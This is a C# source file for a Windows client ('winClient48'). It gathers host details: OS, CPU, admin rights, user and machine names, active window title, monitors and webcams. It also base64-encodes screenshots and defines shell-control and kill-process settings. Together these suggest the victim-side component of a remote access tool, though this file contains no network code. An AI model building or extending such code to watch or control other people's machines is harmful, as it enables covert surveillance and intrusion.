using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    public class Global
    {
        /// <summary>
        /// Return CPU usage percentage.
        /// </summary>
        /// <returns></returns>
        public static string getCPU()
        {
            string result = "[NULL]";
            try
            {
                using (var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
                {
                    // Call NextValue() once to initialize the counter
                    cpuCounter.NextValue();
                    System.Threading.Thread.Sleep(1000); // Wait for a second to get a valid reading

                    // Get CPU usage percentage
                    float cpuUsage = cpuCounter.NextValue();
                    result = ((int)cpuUsage).ToString() + "%";
                }
            }
            catch (Exception ex)
            {

            }

            return result;
        }

        public static string getOS()
        {
            try
            {
                return WMI_QueryNoEncode("SELECT Caption FROM Win32_OperatingSystem")[0];
            }
            catch (Exception ex)
            {
                return "Unknown";
            }
        }

        /// <summary>
        /// Get active window title.
        /// </summary>
        /// <returns></returns>
        public static string GetActiveWindowTitle()
        {
            const int nChars = 512;
            StringBuilder sb = new StringBuilder(nChars);
            IntPtr handle = WinAPI.GetForegroundWindow();

            if (WinAPI.GetWindowText(handle, sb, nChars) > 0)
                return sb.ToString();
            else
                return "";
        }

        public static string[] WMI_QueryNoEncode(string query, string name = null)
        {
            List<string> result = new List<string>();
            using (var searcher = new ManagementObjectSearcher(query))
            {
                using (ManagementObjectCollection coll = searcher.Get())
                {
                    try
                    {
                        foreach (var device in coll)
                        {
                            foreach (PropertyData data in device.Properties)
                            {
                                if (string.IsNullOrEmpty(name))
                                    result.Add(device[data.Name].ToString());
                                else
                                    result.Add(device[name].ToString());
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        return null;
                    }
                }
            }

            return result.ToArray();
        }

        public static string BitmapToBase64(Bitmap bitmap)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                byte[] image_bytes = ms.ToArray();
                return Convert.ToBase64String(image_bytes);
            }
        }
    }

    public enum ShellCtrl
    {
        CtrlC,
        CtrlZ,
    }


    public struct BasicInfo
    {
        public string szOnlineID { get; set; }
        public string szUsername { get { return Dns.GetHostName(); } }
        public bool bIsAdmin 
        { 
            get 
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);

                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        public string szOS
        {
            get
            {
                //string result = Environment.OSVersion.ToString();
                string result = null;
                try { result = Global.WMI_QueryNoEncode("select caption from Win32_OperatingSystem")[0]; } catch { }
                if (result == null)
                    try { result = RuntimeInformation.OSDescription; } catch { }
                if (result == null)
                    try { result = Environment.OSVersion.VersionString; } catch { }

                return result;
            }
        }
        public int dwPing;
        public string szCPU => Global.getCPU();
        public int dwMonitorCount => Screen.AllScreens.Length;
        public int dwWebcamCount => new Webcam().GetDevices().Count;
        public string szActiveWindowTitle;
        public Image imgScreenshot;
    }

    public struct ClientConfig
    {
        public int dwTimeout;
        public int dwRetry;

        public List<string> ls_szKillProcess;
        public bool bKillProcess;
    }

    public struct ClientInfo
    {
        public string szDnsHostName => Dns.GetHostName();
        public string szStartupPath => Application.StartupPath;
        public string szCurrentProcName => Process.GetCurrentProcess().ProcessName;
        public string szMachineName => Environment.MachineName;
        public string szUsername => Environment.UserName;
        public string szUserDomainName => Environment.UserDomainName;
        public string szOS => new BasicInfo().szOS;

        /* Key: Monitor name
         * Value: Monitor rectangle(size) */
        private Dictionary<string, Rectangle> _ls_Monitor;

        public Dictionary<string, Rectangle> ls_Monitor
        {
            get
            {
                if (_ls_Monitor == null)
                {
                    _ls_Monitor = new Dictionary<string, Rectangle>();
                }

                _ls_Monitor.Clear();

                foreach (Screen screen in Screen.AllScreens)
                {
                    _ls_Monitor[screen.DeviceName] = screen.WorkingArea;
                }

                return _ls_Monitor;
            }
        }

        /* Key: Webcam name
         * Value: Webcam rectangle(size) */

        public List<string> ls_Webcam => new Webcam().GetDevices();
    }
}
